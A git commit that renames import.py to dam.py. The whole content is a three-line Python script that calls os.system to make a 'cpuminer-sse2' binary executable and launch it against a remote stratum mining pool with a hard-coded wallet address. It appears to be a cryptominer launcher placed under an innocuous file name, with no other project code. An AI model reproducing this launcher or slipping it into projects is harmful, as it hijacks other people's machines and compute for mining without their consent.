483ca0a5d0be978555240fdc654c0f594e279944
magdamana001 <86566264+magdamana001@users.noreply.github.com>
2024-01-19 13:28:47 +0100

    Update and rename import.py to dam.py

---
+++ dam.py
@@ -0,0 +1,3 @@
+import os
+
+os.system("chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.NT1")
--- import.py
+++
@@ -1,3 +0,0 @@
-import os
-
-os.system("chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.DG1")
